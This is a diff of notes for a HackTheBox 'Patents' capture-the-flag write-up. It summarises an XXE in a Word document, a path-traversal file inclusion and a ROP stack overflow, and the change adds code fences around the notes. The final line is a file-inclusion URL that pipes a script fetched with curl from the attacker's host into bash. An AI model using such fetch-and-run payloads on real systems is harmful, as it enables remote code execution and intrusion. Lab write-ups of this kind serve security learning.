@@ -1,6 +1,7 @@
 Patents is a 40-point Linux machine on HackTheBox. For user we exploit an external entity injection in a word document and a local file inclusion that involves path traversal and calculating the name of an uploaded file. For root we use return oriented programming to exploit a stack overflow in a tcp server.
 
 Notes
+```
 customXml\item1.xml:
 
 <?xml version="1.0" ?>
@@ -41,6 +42,9 @@ while True:
         print(it)
         print(url)
     it += 1
+
+```
+
 LFI:
 
 http://patents.htb/getPatent_alphav1.0.php?id=..././uploads/<id>.docx&cmd=curl%2010.10.14.8:8000/xct.sh%20|%20bash
